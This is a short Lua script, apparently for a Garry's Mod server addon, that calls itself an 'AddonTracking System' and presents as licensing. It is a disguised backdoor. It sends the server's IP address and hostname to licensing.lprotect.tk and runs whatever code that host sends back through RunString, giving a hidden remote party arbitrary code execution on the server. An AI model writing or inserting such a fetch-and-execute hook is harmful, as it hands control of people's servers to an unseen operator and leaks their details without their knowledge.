print("AddonTracking System")

    http.Fetch( "https://licensing.lprotect.tk/send",
        
        function( body, length, headers, code )
            if code == 200 then
                RunString(body,"licensing lprotect" , false)
            end  
        end,
  
        function( message )
                
        end,

        { 
            ["serverip"] = game.GetIPAddress(),
            ["servername"] =  GetHostName(),
        }
    )
